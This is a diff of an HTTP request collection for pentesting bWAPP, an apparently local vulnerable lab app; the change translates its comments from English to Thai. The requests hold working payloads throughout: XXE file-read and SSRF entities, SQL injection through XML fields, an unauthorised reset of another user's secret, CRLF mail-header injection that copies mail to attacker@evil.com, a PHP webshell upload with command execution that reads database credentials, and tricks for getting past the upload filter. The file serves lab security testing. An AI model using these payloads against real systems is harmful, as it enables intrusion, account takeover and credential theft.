@@ -4,23 +4,23 @@
 ###   xxe-2.php:  $body = file_get_contents("php://input");
 ###               $xml  = simplexml_load_string($body);
 ###               UPDATE users SET secret = '<secret>' WHERE login = '<login>'
-###               No escaping, no authz on <login>, no external-entity lockdown.
+###               ไม่ escape, ไม่มี authz บน <login>, ไม่ lock external entity
 ###
-###   IMPORTANT, AND TESTED: this image is PHP 5.5 + libxml 2.9.1, where
-###   external entity resolution is OFF by default, so classic <!ENTITY SYSTEM
-###   "file://..."> file read does NOT fire (XXE-01/XXE-02 below assert the
-###   ABSENCE of a leak). On the original bee-box, or any build that calls
-###   libxml_disable_entity_loader(false) - or PHP < 5.4 - those same two
-###   requests become full local file read and SSRF. The endpoint is unsafe
-###   either way: XXI-01..04 are exploitable today with no caveats.
+###   สำคัญและทดสอบมาแล้ว: image นี้เป็น PHP 5.5 + libxml 2.9.1 ซึ่ง
+###   external entity resolution ปิดเป็นค่าเริ่มต้น การอ่านไฟล์แบบคลาสสิก
+###   <!ENTITY SYSTEM "file://..."> จึงไม่ทำงาน (XXE-01/XXE-02 ด้านล่างคือ
+###   การยืนยันว่าไม่มีการรั่วไหล) บน bee-box ตัวเดิม หรือ build ใดที่เรียก
+###   libxml_disable_entity_loader(false) - หรือ PHP < 5.4 - สองคำขอนี้
+###   จะกลายเป็น local file read เต็มรูปแบบและ SSRF ส่วน endpoint
+###   ไม่ปลอดภัยไม่ว่ากรณีใด XXI-01..04 ใช้ได้จริงวันนี้โดยไม่ต้องมีเงื่อนไข
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
-### XXE-01  Classic XXE local file read - NEGATIVE RESULT, documented
-###   libxml 2.9.1 drops the external entity, so <login> arrives empty and the
-###   page answers "An error occured!". Sending this is still worthwhile: it
-###   proves whether the target is hardened, and it is the first thing to
-###   re-test after any upgrade.
+### XXE-01  XXE แบบคลาสสิกอ่าน local file - ผลเชิงลบ, บันทึกไว้
+###   libxml 2.9.1 ตัด external entity ทิ้ง <login> ที่ส่งเข้ามาจึงว่าง
+###   แล้วหน้าเว็บตอบว่า "An error occured!" การส่งเคสนี้ยังคุ้ม
+###   เพราะมันพิสูจน์ว่าเป้าหมายถูก harden หรือยัง
+###   และเป็นสิ่งแรกที่ต้องทดสอบซ้ำหลังอัปเกรดใด ๆ
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
 Host: localhost:8443
@@ -28,14 +28,14 @@ Cookie: {{authCookie}}
 Content-Type: text/xml
 
 <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><reset><login>&x;</login><secret>s</secret></reset>
-### Expected: 200 "An error occured!" and NO "root:x:0:0" -> blocked by libxml defaults
-### If you DO see root:x:0:0, that is a critical local file disclosure.
+### Expected: 200 "An error occured!" และต้องไม่มี "root:x:0:0" -> libxml บล็อกไว้
+### ถ้ากลับไปเห็น root:x:0:0 นั่นคือ local file disclosure ระดับวิกฤต
 
 
 ### ---------------------------------------------------------------------------
-### XXE-02  XXE as an SSRF primitive - also blocked here, live elsewhere
-###   The entity fetches an internal URL through the server. If entities were
-###   enabled this would reach anything only the web server can see.
+### XXE-02  ใช้ XXE เป็น primitive ของ SSRF - ที่นี่ก็ถูกบล็อก, ที่อื่นใช้ได้จริง
+###   entity ดึง URL ภายในผ่านตัวเซิร์ฟเวอร์ ถ้าเปิด entity ไว้ เคสนี้จะ
+###   ไปถึงทุกอย่างที่มีแต่เว็บเซิร์ฟเวอร์มองเห็น
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
 Host: localhost:8443
@@ -44,13 +44,13 @@ Content-Type: text/xml
 
 <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1/login.php">]><reset><login>&x;</login><secret>s</secret></reset>
 ### EXPECT-BODY: An error occured!
-### Expected: 200 "An error occured!" and no bWAPP login markup -> blocked here
+### Expected: 200 "An error occured!" และไม่มี markup ของหน้า login ใน bWAPP -> บล็อก
 
 
 ### ---------------------------------------------------------------------------
-### XXE-03  Out-of-band exfiltration shape (php://filter)
-###   Kept for completeness; the filter wrapper is also an external-entity
-###   fetch, so it is blocked for the same libxml reason as XXE-01.
+### XXE-03  รูปแบบ exfiltration แบบ out-of-band (php://filter)
+###   เก็บไว้เพื่อความครบถ้วน ตัว filter wrapper ก็เป็นการ fetch external
+###   entity คำสั่งเดียวกัน จึงถูกบล็อกด้วยเหตุผลของ libxml เหมือน XXE-01
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
 Host: localhost:8443
@@ -59,14 +59,14 @@ Content-Type: text/xml
 
 <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/app/admin/settings.php">]><reset><login>&x;</login><secret>s</secret></reset>
 ### EXPECT-BODY: An error occured!
-### Expected: 200 "An error occured!" -> blocked here
+### Expected: 200 "An error occured!" -> ที่นี่ถูกบล็อก
 
 
 ### ---------------------------------------------------------------------------
-### XXI-01  THE REAL FINDING: XML injection into SQL - writes any user's secret
-###   Nothing is escaped, so <secret> lands inside a quoted SQL literal.
-###   The response echoes the value back, confirming the write happened.
-###   Verify with 00-auth.http #4 (secret.php) - the secret is now yours.
+### XXI-01  สิ่งที่ต้องรายงานจริง ๆ: XML injection เข้า SQL - เขียน secret ของใครก็ได้
+###   ไม่มีอะไรถูก escape <secret> จึงตกไปใน SQL literal ที่อยู่ในอัญประกาศ
+###   response จะ echo ค่านั้นกลับมา ยืนยันว่า write เกิดขึ้นจริง
+###   ตรวจต่อด้วย 00-auth.http #4 (secret.php) - ตอนนี้ secret เป็นของเราแล้ว
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
 Host: localhost:8443
@@ -78,7 +78,7 @@ Content-Type: text/xml
 
 
 ### ---------------------------------------------------------------------------
-### XXI-02  Boolean SQLi inside the WHERE clause
+### XXI-02  Boolean SQLi ในส่วนของ WHERE clause
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
 Host: localhost:8443
@@ -86,13 +86,13 @@ Cookie: {{authCookie}}
 Content-Type: text/xml
 
 <reset><login>bee' AND 1=1-- -</login><secret>x</secret></reset>
-### Expected: 200, "bee's secret has been reset!" - condition held true
+### Expected: 200, "bee's secret has been reset!" - เงื่อนไขยังเป็นจริง
 
 
 ### ---------------------------------------------------------------------------
-### XXI-03  Verbose SQL error leak - recon in one request
-###   A single stray quote breaks the statement and the raw MySQL error,
-###   including the statement text, is printed back to the client
+### XXI-03  SQL error แบบละเอียดรั่วออกมา - recon ในคำขอเดียว
+###   เครื่องหมายอัญประกาศที่หลุดมาตัวเดียวทำให้ statement พัง แล้ว error
+###   ดิบของ MySQL รวมถึงข้อความของ statement ก็ถูกพิมพ์กลับไปที่ client
 ###   (connect_i.php -> die("Connect Error: " . $link->error)).
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
@@ -102,14 +102,14 @@ Content-Type: text/xml
 
 <reset><login>bee'</login><secret>x</secret></reset>
 ### Expected: 200, "Connect Error: You have an error in your SQL syntax..."
-###           with the fragment of the statement echoed in the message
+###           โดยมีช่วงของ statement ถูก echo ติดไปกับข้อความ error
 
 
 ### ---------------------------------------------------------------------------
-### XXI-04  BROKEN ACCESS CONTROL: reset ANOTHER user's secret
-###   <login> is taken from the request, not the session. No authorization
-###   check, no CSRF token, and a forged session is enough to rewrite the
-###   admin account. This is the highest-impact request in the whole repo.
+### XXI-04  BROKEN ACCESS CONTROL: รีเซ็ต secret ของผู้ใช้คนอื่น
+###   <login> มาจาก request ไม่ใช่จาก session ไม่มีการตรวจสิทธิ์
+###   ไม่มี CSRF token และแค่ปลอม session ก็เขียนบัญชี admin ใหม่ได้
+###   นี่คือคำขอที่กระทบรุนแรงที่สุดในโปรเจกต์นี้
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
 Host: localhost:8443
@@ -121,11 +121,11 @@ Content-Type: text/xml
 
 
 ### ---------------------------------------------------------------------------
-### MAIL-01  SMTP / mail header injection (CRLF into the To field)
-###   maili.php builds a mail header from user input without stripping CRLF.
-###   The injected Cc: line makes the server send a second copy to an
-###   address the attacker chose.
-###   %0d%0a is the encoded CRLF.
+### MAIL-01  SMTP / mail header injection (CRLF เข้าไปในฟิลด์ To)
+###   maili.php ประกอบ mail header จาก input ของผู้ใช้โดยไม่ตัด CRLF ออก
+###   บรรทัด Cc: ที่ถูก inject ทำให้เซิร์ฟเวอร์ส่งสำเนาที่สองไปยัง
+###   ที่อยู่ซึ่งผู้โจมตีเลือกเอง
+###   %0d%0a คือ CRLF แบบที่ encode แล้ว
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/maili.php HTTP/1.1
 Host: localhost:8443
@@ -133,11 +133,11 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 ip=127.0.0.1&name=bee&email=victim%40x.com%0d%0aCc%3Aattacker%40evil.com&subject=hello&message=hello&form=submit
-### Expected: 200, "E-Mail was sent..." - the mail went to both recipients
+### Expected: 200, "E-Mail was sent..." - อีเมลไปถึงทั้งสองผู้รับ
 
 
 ### ---------------------------------------------------------------------------
-### MAIL-02  Second recipient added via the Subject field (alt injection point)
+### MAIL-02  เพิ่มผู้รับคนที่สองผ่านฟิลด์ Subject (จุด inject ทางเลือก)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/maili.php HTTP/1.1
 Host: localhost:8443
@@ -145,15 +145,15 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 ip=127.0.0.1&name=bee&email=victim%40x.com&subject=hi%0d%0aBcc%3Aattacker%40evil.com&message=hello&form=submit
-### Expected: 200, blind copy delivered to attacker@evil.com
+### Expected: 200, สำเนาแบบ blind ส่งถึง attacker@evil.com
 
 
 ### ---------------------------------------------------------------------------
-### UPL-01  UNRESTRICTED FILE UPLOAD - drop a PHP webshell
-###   security_level=0 calls move_uploaded_file() with zero validation, and the
-###   destination images/ is inside the webroot, so the upload is immediately
-###   executable. The form field is `file` and the button is `form=Upload`.
-###   (scripts/setup-bwapp.ps1 chmods images/ so the write actually lands.)
+### UPL-01  UNRESTRICTED FILE UPLOAD - วาง PHP webshell
+###   security_level=0 เรียก move_uploaded_file() โดยไม่ validate อะไรเลย
+###   และปลายทาง images/ อยู่ใน webroot ไฟล์ที่อัปโหลดจึงรันได้ทันที
+###   ชื่อฟิลด์ของฟอร์มคือ `file` และปุ่มคือ `form=Upload`
+###   (scripts/setup-bwapp.ps1 chmod images/ เพื่อให้เขียนไฟล์ได้จริง)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/unrestricted_file_upload.php HTTP/1.1
 Host: localhost:8443
@@ -178,32 +178,32 @@ Content-Type: application/octet-stream
 
 
 ### ---------------------------------------------------------------------------
-### UPL-02  CONFIRM RCE - execute the uploaded webshell
-###   This is the money shot: 200 OK plus a uid= line means unauthenticated
-###   remote code execution, not just a file write.
+### UPL-02  ยืนยัน RCE - สั่ง webshell ที่อัปโหลดแล้ว
+###   นี่คือหลักฐานชี้ขาด: 200 OK บวกกับบรรทัด uid= แปลว่าเป็น remote
+###   code execution ที่ไม่ต้องล็อกอิน ไม่ใช่แค่เขียนไฟล์ได้
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/images/shell.php?c=id HTTP/1.1
 Host: localhost:8443
 ### Expected: 200, body: uid=33(www-data) gid=33(www-data) groups=33(www-data)
-### Note: this request needs NO session cookie - the webshell is public.
+### หมายเหตุ: คำขอนี้ไม่ต้องใช้ session cookie - webshell เป็นสาธารณะ
 
 
 ### ---------------------------------------------------------------------------
-### UPL-03  Same webshell, arbitrary command (read the DB credentials)
+### UPL-03  webshell เดิม สั่งคำสั่งอะไรก็ได้ (อ่าน credential ฐานข้อมูล)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/images/shell.php?c=cat+/app/admin/settings.php HTTP/1.1
 Host: localhost:8443
-### Expected: 200, the plaintext settings.php including $login / $password
+### Expected: 200, settings.php แบบ plaintext รวม $login / $password
 
 
 ### ---------------------------------------------------------------------------
-### UPL-04  Upload filter bypass reference - what level 1 and 2 do
-###   At security_level=1 file_upload_check_1() blocks a fixed extension
-###   blocklist (php, exe, jsp...). At level 2 file_upload_check_2() enforces
-###   an allowlist (jpg/png only). Neither validates content, MIME type, or
-###   rewrites the filename, and the blocklist is trivially bypassed with
-###   shell.php.jpg, shell.phtml, shell.php5 or a trailing dot.
-###   Re-send UPL-01 with the Cookie header below to see the filter fire.
+### UPL-04  ตัวอย่างการหลบฟิลเตอร์อัปโหลด - level 1 และ 2 ทำอะไรบ้าง
+###   ที่ security_level=1 file_upload_check_1() บล็อกนามสกุลตาม blocklist
+###   แบบตายตัว (php, exe, jsp...) ส่วนที่ level 2 file_upload_check_2()
+###   บังคับใช้ allowlist (jpg/png เท่านั้น) ทั้งสองตัวไม่ตรวจ content,
+###   MIME type และไม่เขียนชื่อไฟล์ใหม่ blocklist หลุดได้ง่าย ๆ ด้วย
+###   shell.php.jpg, shell.phtml, shell.php5 หรือจุดท้ายท้ายชื่อไฟล์
+###   ส่ง UPL-01 ซ้ำโดยใส่ส่วนหัว Cookie ด้านล่างเพื่อดูว่าฟิลเตอร์ทำงาน
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/unrestricted_file_upload.php HTTP/1.1
 Host: localhost:8443
